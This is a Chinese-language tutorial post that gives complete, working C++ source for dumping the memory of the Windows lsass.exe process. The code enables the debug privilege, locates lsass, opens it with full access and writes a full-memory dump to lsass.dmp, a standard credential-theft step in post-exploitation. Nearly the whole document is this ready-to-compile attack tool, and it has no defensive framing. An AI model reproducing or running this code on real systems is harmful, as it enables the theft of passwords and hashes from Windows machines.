#关于[MiniDumpWriteDump]Win32 API dump lsass内存
利用MiniDumpWriteDump来dump lsass已经不是一个老的技术了，但是根据网上的实例，我发现了一些问题，网上绝大多数部分，均是使用了OpenProcess 这个Win API打开进程，从而获取lsass.exe的进程句柄，但是根据自己的尝试，发现，在没有debug权限的情况下，OpenProcess会抛出5的错误，及权限不足以打开lsass.exe进程。至此，我将代码进行了完善，使其程序能只在管理员权限下即可dump lsass.exe内存
```
#include <windows.h>
#include <iostream>
//  MiniDumpWriteDump需要
#include <dbghelp.h>
#include <TlHelp32.h>
#pragma comment(lib,"Dbghelp.lib")
using namespace std;
// 进行特权提升
BOOL EnableDebugPrivilege() {
    // 创建令牌句柄
    HANDLE HandleToken = NULL;
    BOOL FOK = FALSE;
    // 打开当前进程的令牌，其中TOKEN_ADJUST_PRIVILEGES为启用或禁止令牌中的权限所必须，HandleToken为返回的句柄
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HandleToken)) {
        // 获取成功之后，执行debug权限提升
        TOKEN_PRIVILEGES TP; //创建令牌信息结构体
        TP.PrivilegeCount = 1; //设置privilege数组中条目数
        //检索本地唯一性标识符的特定LUID
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &TP.Privileges[0].Luid); //检索特权标识符所指定的特权名称，其中SE_DEBUG_NAME 为调试和调整另一个帐户拥有的进程的内存所必需。
        TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; //启用特权
        //启用访问的特权令牌
        AdjustTokenPrivileges(HandleToken, FALSE, &TP, sizeof(TP), NULL, NULL);
        //捕捉错误，为ERROR_SUCCESS则特权提升成功
        FOK = (GetLastError() == ERROR_SUCCESS);
        CloseHandle(HandleToken);
    }
    return FOK;
}
int main() {
    // 创建一个文件句柄，用户写入dump下来的数据,其中GENERIC_ALL为获取所有可能的权限
    HANDLE dumpFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    // 定义一个控进程句柄
    HANDLE ProcessHandle = NULL;
    //定义当前进程的PID
    DWORD ProcessPID = 0;
    //定义当前的进程名称
    LPCWSTR  ProcessName = L"";
    // 先便利所有进程，查询到所需要dump的进程PID
    HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // 给系统内的所有进程拍摄快照
    // 创建PROCESSENTRY32结构体,里面包含着进程的信息，如进程名称等
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    // 如果获取到第一个进程信息的话，执行后续内容 
    if (Process32First(Snapshot, &processEntry)) {
        //成功获取第一个进程信息，执行while循环，知道找到要dump的指定进程
        //_wcsicmp 比较二者是否相同，如果相同则返回0，否则返回大于或小于0的数字
        while (_wcsicmp(ProcessName, L"lsass.exe") != 0) {
            // 检索下一个进程的全部信息
            if (Process32Next(Snapshot, &processEntry)) {
                //检索成功，返回true，执行if内操作
                ProcessName = processEntry.szExeFile; // PROCESSENTRY32结构体，szExeFile为进程名称
                ProcessPID = processEntry.th32ProcessID; // PROCESSNTRY32结构体，th32ProcessID为进程PID
            }
            else {
                cout << "[-] Process32Next Failed !   ProcessName :" << ProcessName << endl;
            }
        }
        cout << "[+] Get Process: " << ProcessName << " PID : " << ProcessPID << endl;
    }
    //打开进程权限，气筒Debug
    if (EnableDebugPrivilege()) {
        // 打开该进程，获取该进程句柄，PROCESS_ALL_ACCESS 为获取所有的可能权限
        ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessPID);
        //cout << GetLastError() << endl;
        //执行dump内存操作,MiniDumpwithFullMemory为dump最大权限的内容
        BOOL dump_status = MiniDumpWriteDump(ProcessHandle, ProcessPID, dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (dump_status) {
            cout << "[+] dump success, file name is lsass.dmp !";
        }
        else {
            cout << "[-] dump Failed !";
        }
        return 0;
        //关闭进程句柄
        CloseHandle(ProcessHandle);
    }
    else {
        cout << "[-] PrivilegeToken is Failed";
    }
}
```
